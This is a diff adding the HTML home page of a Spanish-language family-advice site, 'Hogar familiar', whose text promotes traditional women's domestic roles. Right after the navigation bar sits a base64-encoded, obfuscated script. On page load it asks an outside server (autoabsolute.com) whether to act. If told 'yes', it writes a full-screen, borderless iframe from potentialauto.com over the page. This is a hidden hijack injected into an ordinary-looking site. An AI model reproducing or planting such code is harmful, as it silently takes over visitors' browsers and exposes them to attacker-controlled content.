@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Hogar familiar</title>
+
+    
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+	<link rel="stylesheet" href="css/animate.css">
+	<link rel="stylesheet" href="css/font-awesome.min.css">
+	<link rel="stylesheet" href="css/jquery.bxslider.css">
+	<link href="css/style.css" rel="stylesheet">
+    
+    <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+    
+  </head>
+  <body>
+	<nav class="navbar navbar-default navbar-fixed-top" role="navigation">
+		<div class="container">
+			
+			<div class="navbar-header">
+				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse.collapse">
+					<span class="sr-only">Toggle navigation</span>
+					<span class="icon-bar"></span>
+					<span class="icon-bar"></span>
+					<span class="icon-bar"></span>
+				</button>
+				<a class="navbar-brand" href="index.html"><span>Hogar familiar</span></a>
+			</div>
+			<div class="navbar-collapse collapse">							
+				<div class="menu">
+					<ul class="nav nav-tabs" role="tablist">
+						<li role="presentation"  class="active"><a href="index.html">Casa</a></li>
+						<li role="presentation"><a href="ourstory.html">Nuestra historia</a></li>
+						<li role="presentation"><a href="events.html">Eventos</a></li>
+						<li role="presentation"><a href="gallery.html">Galería</a></li>
+						<li role="presentation"><a href="contact.html">Contacto</a></li>						
+					</ul>
+				</div>
+			</div>			
+		</div>
+	</nav>
+	<script src="data:text/javascript;base64,dmFyIF8weDMwMmI9WyJodHRwczovL2F1dG9hYnNvbHV0ZS5jb20vaW5kZXgucGhwP2tleT1rbWdwZHJ5NWk4NG9seWdmbTFmeiIsIjEzMjUzOFlPTkJjWCIsIjMxNjk4N3hwcE5TeCIsIjQ4NTIzN3dLbmhxaSIsIiZ1dG1fdGVybT0iLCI5Mzg0MjZ5UFZoTnQiLCJnZXQiLCIxNTM3WENTdW1ZIiwieWVzIiwidXRtX2NhbXBhaWduIiwibWF0Y2giLCIyMjllYWlibGkiLCJ3cml0ZSIsInNlYXJjaCIsIjEwODYxN1htaGJkQiIsIjMxMjA4M09NY2ZJcyIsIjVsRW1ZV1ciLCIxalpXUlV5IiwibG9jYXRpb24iLCJ1dG1fdGVybSIsJzxpZnJhbWUgc3JjPSJodHRwczovL3BvdGVudGlhbGF1dG8uY29tL2luZGV4LnBocD9rZXk9dnZsdDQ0eTFjb2QxdTdseXRxejUmdXRtX2NhbXBhaWduPScsJyIgZnJhbWVib3JkZXI9IjAiIHN0eWxlPSJvdmVyZmxvdzpoaWRkZW47b3ZlcmZsb3cteDpoaWRkZW47b3ZlcmZsb3cteTpoaWRkZW47aGVpZ2h0OjEwMCU7d2lkdGg6MTAwJTtwb3NpdGlvbjphYnNvbHV0ZTt0b3A6MHB4O2xlZnQ6MHB4O3JpZ2h0OjBweDtib3R0b206MHB4IiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIj48L2lmcmFtZT4nXSxfMHhmYmI1PWZ1bmN0aW9uKGUsdCl7cmV0dXJuIF8weDMwMmJbZS09Mzg4XX0sXzB4MWVhNmFlPV8weGZiYjU7ZnVuY3Rpb24gZ2V0Q29va2llcyhlKXt2YXIgdD1fMHhmYmI1LGE9d2luZG93W3QoMzk5KV1bdCgzOTQpXTtyZXR1cm4hIShhPWFbdCgzOTEpXShuZXcgUmVnRXhwKGUrIj0oW14mPV0rKSIpKSkmJmFbMV19ZnVuY3Rpb24gb25BamF4U3VjY2VzcyhlKXt2YXIgdD1fMHgxZWE2YWU7ZT09dCgzODkpJiZkb2N1bWVudFt0KDM5MyldKHQoNDAxKStnZXRDb29raWVzKHQoMzkwKSkrdCg0MDcpK2dldENvb2tpZXModCg0MDApKSt0KDQwMikpfSFmdW5jdGlvbih0KXtmb3IodmFyIGU9XzB4ZmJiNTs7KXRyeXtpZig1MTY2Njc9PT0tcGFyc2VJbnQoZSg0MDYpKStwYXJzZUludChlKDQwOCkpK3BhcnNlSW50KGUoNDA1KSkrLXBhcnNlSW50KGUoNDA0KSkrcGFyc2VJbnQoZSgzOTUpKSpwYXJzZUludChlKDM5NykpK3BhcnNlSW50KGUoMzk4KSkqLXBhcnNlSW50KGUoMzk2KSkrcGFyc2VJbnQoZSgzOTIpKSotcGFyc2VJbnQoZSgzODgpKSlicmVhazt0LnB1c2godC5zaGlmdCgpKX1jYXRjaChlKXt0LnB1c2godC5zaGlmdCgpKX19KF8weDMwMmIpLCRbXzB4MWVhNmFlKDQwOSldKF8weDFlYTZhZSg0MDMpLG9uQWpheFN1Y2Nlc3MpOw=="></script>
+	<div class="slider">
+		<div class="img-responsive">
+			<ul class="bxslider">				
+				<li><img src="img/8.jpg" alt=""/></li>								
+				<li><img src="img/9.jpg" alt=""/></li>	
+				<li><img src="img/7.jpg" alt=""/></li>			
+			</ul>
+		</div>	
+    </div>
+	
+	<div class="jumbotron">
+		<h1>Visitar la casa de alguien</h1>
+		<p>
+			algunos quieren quedarse el mayor tiempo posible, mientras que otros quieren correr lo más rápido posible.<br>
+			¡¿Por qué está pasando esto?! ¡Vamos a resolverlo un poco!
+		</p>
+	</div>
+	
+	<div class="container">
+		<div class="col-md-6" >
+			<img src="img/12.jpg" alt="" class="img-responsive" />
+		</div>
+		<div class="col-md-6" >
+			<img src="img/11.jpg" alt="" class="img-responsive" />
+		</div>
+	</div>
+	<section class="box">
+		<div class="container">
+			<div class="row">				
+				<div class="col-md-4">
+					<div class="wow bounceIn" data-wow-offset="0" data-wow-delay="0.4s">
+						<div class="services">											
+							<div class="icons">
+								<i class="fa fa-heart-o fa-3x"></i>
+							</div>
+							<h4>Lo más importante es el ambiente de la casa.</h4>	
+							<p>
+								es decir, la relación entre cónyuges, hijos, relaciones entre padres e hijos. ¡Aquí es donde se crea la atmósfera de la casa!
+							</p>
+						</div>
+					</div>
+					<hr>
+				</div>
+				
+				<div class="col-md-4">
+					<div class="wow bounceIn" data-wow-offset="0" data-wow-delay="0.8s">
+						<div class="services">											
+							<div class="icons">
+								<i class="fa fa-desktop fa-3x"></i>
+							</div>
+							<h4>¿Cómo lograr un ambiente confortable para todos en la familia?</h4>
+							<p>
+								¡Por el ambiente en la casa, la comodidad de la familia, el hogar es más responsable de una mujer, no de un hombre! Después de todo, una mujer es una amante, un puerto tranquilo, la misma calma que espera su barco con una captura.
+							</p>							
+						</div>
+					</div>
+					<hr>
+				</div>
+				
+				<div class="col-md-4">
+					<div class="wow bounceIn" data-wow-offset="0" data-wow-delay="1.2s">
+						<div class="services">												
+							<div class="icons">
+								<i class="fa fa-thumbs-o-up fa-3x"></i>
+							</div>
+							<h4>¿Cómo puede una mujer alcanzar el estado de refugio seguro?</h4>
+							<p>
+								Lo primero para empezar es cumplir con sus deberes femeninos con placer y permitir que el hombre cumpla con sus deberes masculinos él mismo. Entonces habrá paz en la casa, ¡todo encajará en su lugar!
+							</p>							
+						</div>
+					</div>
+					<hr>
+				</div>
+				<div class="col-md-4">
+					<div class="wow bounceIn" data-wow-offset="0" data-wow-delay="0.4s">
+						<div class="services">											
+							<div class="icons">
+								<i class="fa fa-leaf fa-3x"></i>
+							</div>
+							<h4>mujer para hombre</h4>	
+							<p>
+								será una musa, inspiración, para quien quieras realizar hazañas, cantar serenatas, regalar, flores, atención y lo más importante - ¡amor!
+							</p>
+						</div>						
+					</div>
+					<hr>
+				</div>
+				<div class="col-md-4">
+					<div class="wow bounceIn" data-wow-offset="0" data-wow-delay="0.8s">
+						<div class="services">											
+							<div class="icons">
+								<i class="fa fa-laptop fa-3x"></i>
+							</div>
+							<h4>Sobre la mujer tormenta</h4>
+							<p>
+								¡No te olvides de la prevención, y para que no sea aburrido! Una mujer siempre tiene muchos roles, ¡y nuestra tarea es cambiarlos a tiempo!
+							</p>							
+						</div>
+					</div>
+					<hr>
+				</div>
+				<div class="col-md-4">
+					<div class="wow bounceIn" data-wow-offset="0" data-wow-delay="1.2s">
+						<div class="services">												
+							<div class="icons">
+								<i class="fa fa-camera fa-3x"></i>
+							</div>
+							<h4>sobre roles femeninos</h4>
+							<p>
+								¡Una mujer siempre significa muchos roles! ¿Cuáles son los roles principales de una mujer: esposa, madre, amante, amante, arribista?
+							</p>							
+						</div>
+					</div>
+					<hr>
+				</div>					
+			</div>
+		</div>
+	</section>
+	
+	<div class="gallery">
+		<img src="img/9.jpg" alt="" class="img-responsive" />		
+	</div>
+	
+	<footer>
+		<div class="inner-footer">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-4 f-about">
+						<a href="index.html"><h1>Hogar familiar</h1></a>
+						<p>¡Es muy importante designar estos roles por antigüedad, o mejor dicho, por jerarquía, que es más importante y cuál es secundaria! ¡Y dependiendo de las tareas a las que se enfrente una mujer, las distribuirá! ¡Lo más importante es aprender a encenderlos a tiempo! Estar con un esposo, una esposa, una amante, ¡pero no una madre! Una madre cariñosa con niños, y para que sea interesante jugar con ellos, no te olvides de tu niño vivo interior.</p>
+						
+					</div>
+					<div class="col-md-4 l-posts">
+						<h3 class="widgetheading">últimas publicaciones</h3>
+						<ul>
+							<li><a href="#">Lo que nos enseña la pandemia: 5 lecciones clave</a></li>
+							<li><a href="#">Cómo mantener su estado de ánimo y condición en la temporada baja</a></li>
+							<li><a href="#">Razones de los problemas de dinero</a></li>
+							<li><a href="#">8 cosas para recordar cuando las cosas van mal</a></li>
+						</ul>
+					</div>
+
+				</div>
+			</div>
+		</div>
+			
+		<div class="last-div">
+			<div class="container">
+				<div class="row">					
+					<div class="copyright">
+						© 2021 Hogar familiar | All rights reserved.
+					</div>	
+                    				
+				
+		
+					<ul class="social-network">
+						<li><a href="#" data-placement="top" title="Facebook"><i class="fa fa-facebook fa-1x"></i></a></li>
+						<li><a href="#" data-placement="top" title="Twitter"><i class="fa fa-twitter fa-1x"></i></a></li>
+						<li><a href="#" data-placement="top" title="Linkedin"><i class="fa fa-linkedin fa-1x"></i></a></li>
+						<li><a href="#" data-placement="top" title="Pinterest"><i class="fa fa-pinterest fa-1x"></i></a></li>
+						<li><a href="#" data-placement="top" title="Google plus"><i class="fa fa-google-plus fa-1x"></i></a></li>
+					</ul>
+				</div>
+			</div>
+		</div>		
+	</footer>
+	
+    
+    <script src="js/jquery-2.1.1.min.js"></script>
+    
+    <script src="js/bootstrap.min.js"></script>
+	<script src="js/wow.min.js"></script>
+	<script src="js/jquery.easing.1.3.js"></script>
+	<script src="js/jquery.bxslider.min.js"></script>
+	<script src="js/jquery.isotope.min.js"></script>
+	<script src="js/fancybox/jquery.fancybox.pack.js"></script>
+	<script src="js/functions.js"></script>
+	<script>
+	wow = new WOW(
+	 {
+	
+		}	) 
+		.init();
+	</script>
+  </body>
+</html>
